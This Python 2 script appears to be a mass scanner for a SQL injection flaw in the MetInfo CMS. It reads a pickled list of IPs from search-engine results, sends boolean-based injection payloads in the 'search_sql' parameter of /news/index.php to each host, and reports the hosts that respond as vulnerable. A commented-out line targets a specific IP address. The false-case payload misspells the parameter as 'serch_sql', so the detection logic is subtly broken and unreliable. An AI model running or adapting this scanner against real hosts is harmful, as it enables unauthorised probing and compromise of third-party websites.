#!/bin/env python
#encoding:utf-8

import re
#import requests
import urllib2
import json
import pickle

def readSearchResult(file):
	f = open(file,"rb")
	data = pickle.load(f)
	print type(data)

	#pprint.pprint(data1)
	f.close()
	return data

def attack(url):
	a = "http://{target}/news/index.php?".format(target=url)

	playLoadTrue = "http://{target}/news/index.php?"\
			"search_sql=%20123qwe%20"\
			"where%201234%3D1234%20--%20x&imgproduct=xxxx".format(target=url)

	playLoadFalse = "http://{target}/news/index.php?"\
			"serch_sql=%20123qwe%20"\
			"where%201234%3D1235%20--%20x&imgproduct=xxxx".format(target=url)

	"""
	print a
	r  = requests.get(a)
	print json.loads(r.text)
	"""

	"""
	r = requests.get(playLoadTrue)
	data_true = json.loads(r.text)
	"""
	try:
		req = urllib2.Request(playLoadTrue)
		resp = urllib2.urlopen(req)
		if resp.code != 200:
			return
		data_true = resp.read()

		#print data_true
		if not re.search(r'href=["\' ]shownews\.php\?lang=', data_true, re.M):
				return


		"""
		r = requests.get(playLoadTrue)
		data_false = json.loads(r.text)
		"""

		req = urllib2.Request(playLoadFalse)
		resp = urllib2.urlopen(req)
		if resp.code != 200:
			return
		data_false = resp.read()
		#print data_false

		if re.search(r'href=["\' ]shownews\.php\?lang=', data_false, re.M):
			return

		print "%s is vulnerable!" % url
	except:
		pass

#attack("218.28.99.182")
def main(file):
	print "MetInfo running"
	ip_list = []
	data = readSearchResult(file)
	j = 0
	for _ in data:
		for x in _['matches']:
			#logger.info("find ip:" + x['ip'])
			print x['ip']
			ip_list.append(x['ip'])
			j += 1
	print j
	for ip in ip_list:
		attack(ip)
